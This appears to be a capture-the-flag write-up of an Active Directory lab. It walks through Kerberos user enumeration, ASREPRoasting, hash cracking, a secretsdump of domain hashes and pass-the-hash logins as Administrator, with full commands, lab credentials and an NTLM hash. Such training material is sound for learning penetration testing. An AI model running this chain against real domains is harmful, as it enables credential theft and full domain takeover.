# Setup
## Installing Impacket:
Whether you're on the Kali 2019.3 or Kali 2021.1, Impacket can be a pain to install  correctly. Here's some instructions that may help you install it 
correctly!

Note: All of the tools mentioned in this task are installed on the AttackBox already. These steps are only required if you are setting up on your own VM. 
Impacket may also need you to use a python version ```>=3.7```. In the AttackBox you can do this by running your command with ```python3.9 <your command>```.

First, you will need to clone the Impacket Github repo onto your box. The following command will clone Impacket into ```/opt/impacket```:

```sh
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
```

After the repo is cloned, you will notice several install related files, requirements.txt, and setup.py. A commonly skipped file during the installation 
is setup.py, this actually installs Impacket onto your system so you can use it and not have to worry about any dependencies.

To install the Python requirements for Impacket:
```sh
pip3 install -r /opt/impacket/requirements.txt
```
  
Once the requirements have finished installing, we can then run the python setup install script:
```sh
cd /opt/impacket/ && python3 ./setup.py install
```

After that, Impacket should be correctly installed now and it should be ready to use!

If you are still having issues, you can try the following script and see if this works:
```sh
sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
sudo pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/ 
sudo pip3 install .
sudo python3 setup.py install
```
## Installing Bloodhound and Neo4j
Bloodhound is another tool that we'll be utilizing while attacking Attacktive Directory. We'll cover specifcs of the tool later, but for now, we need to 
install two packages with Apt, those being bloodhound and neo4j. You can install it with the following command:

```sh
apt install bloodhound neo4j
```  

# Enumeration
Enum4linux is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar functionality to enum.exe formerly 
available from www.bindview.com.

It is written in PERL and is basically a wrapper around the Samba tools smbclient, rpclient, net and nmblookup. The samba package is therefore a 
dependency.

## Features include:
- RID Cycling (When RestrictAnonymous is set to 1 on Windows 2000)
- User Listing (When RestrictAnonymous is set to 0 on Windows 2000)
- Listing of Group Membership Information
- Share Enumeration
- Detecting if host is in a Workgroup or a Domain
- Identifying the remote Operating System
- Password Policy Retrieval (using polenum)

Q: What invalid TLD do people commonly use for their Active Directory Domain?
A: .local

## Enumerating Users via Kerberos
A whole host of other services are running, including Kerberos. Kerberos is a key authentication service within Active Directory. With this port open, we 
can use a tool called Kerbrute (by Ronnie Flathers @ropnop) to brute force discovery of users, passwords and even password spray!

**Note**: Several users have informed me that the latest version of Kerbrute does not contain the UserEnum flag in Kerbrute, if that is the case with the 
version you have selected, try a older version!

### Enumeration:
For this box, a modified [User List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt) and 
[Password List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt) will be used to cut down on time of 
enumeration of users and password hash cracking. It is NOT recommended to brute force credentials due to account lockout policies that we cannot 
enumerate on the domain controller.

```sh
./kerbrute userenum -d spookysec.local --dc 10.10.46.48 userlist.txt
```

# Abusing Kerberos
After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. 
**ASReproasting** occurs when a user account has the privilege **"Does not require Pre-Authentication"** set. This means that the account does not 
need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

## Retrieving Kerberos Tickets
```Impacket``` has a tool called **"GetNPUsers.py"** (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts 
from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via 
Kerbrute.

Remember:  Impacket may also need you to use a python version >=3.7. In the AttackBox you can do this by running your command with 
python3.9 /opt/impacket/examples/GetNPUsers.py.

```sh
python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.46.48 spookysec.local/svc-admin -no-pass
```

Put the complete hash in kerbhash file and then use john to crack the password.
```sh
john kerbhash --wordlist=passwordslist.txt
```

or use hashcat as below:
```sh
hashcat -m 18200 -a 0 kerbhash passwordlist.txt
```

With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the 
domain controller may be giving out.

Now we can use this password to list shares using smbclient:
```sh
smbclient -L 10.10.46.48 -U svc-admin
```

We can mount the share using below command:
```sh
smbclient -U svc-admin //10.10.46.48/backup
```
# Elevating Privileges within the Domain
Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account "backup" gets us 
thinking. What is this the backup account to?

Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced 
with this user account. This includes password hashes

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/8db63b8d-76e9-415b-bc32-e7d76ba49818)

Knowing this, we can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this 
user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.

```sh
python3.9 /opt/impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@10.10.46.48
```

"[Pass the hash](https://www.beyondtrust.com/resources/glossary/pass-the-hash-pth-attack)" method of attack could allow us to authenticate as the user without the password.

Using the hash above we can login as below:
```sh
evil-winrm -i 10.10.46.48 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

Or we can use impacket's psexec.py script:
```sh
python3.9 /opt/impacket/examples/psexec.py Administrator:@10.10.46.48 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
```

